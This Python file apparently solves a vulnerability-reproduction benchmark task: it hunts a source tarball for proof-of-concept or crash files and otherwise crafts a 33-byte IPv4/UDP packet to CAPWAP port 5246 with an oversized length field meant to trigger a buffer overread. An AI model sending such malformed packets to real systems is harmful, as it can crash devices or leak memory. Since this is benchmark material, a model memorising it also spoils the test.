import tarfile
import struct
import io
import os
import re

class Solution:
    def _read_tar_candidates(self, src_path):
        cands = []
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    # Skip obvious source/object files to limit noise
                    if name.endswith(('.c', '.h', '.cpp', '.hpp', '.cc', '.o', '.a', '.so', '.lo', '.la', '.pc', '.m4', '.ac', '.am', '.mk', '.in', '.txt', '.md')):
                        pass  # still allow: sometimes PoCs are .txt
                    # Heuristic scoring
                    score = 0
                    if 'capwap' in name:
                        score += 5
                    if 'poc' in name or 'proof' in name or 'repro' in name or 'reproducer' in name:
                        score += 4
                    if 'crash' in name or 'min' in name or 'minimized' in name or 'id:' in name:
                        score += 3
                    if 'seed' in name or 'input' in name or 'testcase' in name or 'corpus' in name:
                        score += 2
                    if score == 0:
                        continue
                    # size check
                    if m.size > 1024 * 1024:  # 1MB max to avoid huge files
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        if not data:
                            continue
                        # Additional content-based scoring
                        if b'CAPWAP' in data or b'capwap' in data:
                            score += 2
                        # Penalize if looks like text source rather than binary input
                        if b'\x00' in data:
                            score += 1
                        cands.append((score, len(data), name, data))
                    except Exception:
                        continue
        except Exception:
            pass
        # Sort by score desc, then by closeness to 33 bytes, then by shorter length
        def keyfn(x):
            score, length, name, data = x
            return (-score, abs(33 - length), length)
        cands.sort(key=keyfn)
        return cands

    def _build_ipv4_udp_packet(self, src_port, dst_port, payload):
        # IPv4 header (no options)
        ver_ihl = (4 << 4) | 5
        tos = 0
        total_len = 20 + 8 + len(payload)
        identification = 0
        flags_fragment = 0
        ttl = 64
        proto = 17  # UDP
        checksum = 0  # leave zero; many harnesses don't validate
        src_ip = 0x01010101  # 1.1.1.1
        dst_ip = 0x02020202  # 2.2.2.2
        ip_hdr = struct.pack('!BBHHHBBHII',
                             ver_ihl, tos, total_len, identification,
                             flags_fragment, ttl, proto, checksum,
                             src_ip, dst_ip)
        # UDP header
        udp_len = 8 + len(payload)
        udp_checksum = 0
        udp_hdr = struct.pack('!HHHH', src_port, dst_port, udp_len, udp_checksum)
        return ip_hdr + udp_hdr + payload

    def _default_poc(self):
        # Construct a minimal IPv4+UDP packet to CAPWAP control port (5246)
        # with a tiny payload that suggests an excessively large internal length,
        # potentially triggering the historical overread in vulnerable versions.
        # Total length: 20(IP) + 8(UDP) + 5(payload) = 33 bytes
        # Payload fields are chosen to maximize chances of triggering buggy parsing.
        payload = bytes([
            0x00,       # flags/version (intentionally 0 to exercise edge paths)
            0x00,       # type/flags
            0xFF, 0xFF, # a large length field (if interpreted)
            0x00        # minimal extra to pass simple checks
        ])
        return self._build_ipv4_udp_packet(src_port=12345, dst_port=5246, payload=payload)

    def solve(self, src_path: str) -> bytes:
        # Try to locate an existing PoC inside the tarball if available
        cands = self._read_tar_candidates(src_path)
        if cands:
            # Return the top-scoring candidate
            return cands[0][3]
        # Fallback: return a crafted minimal IPv4+UDP CAPWAP packet (33 bytes)
        return self._default_poc()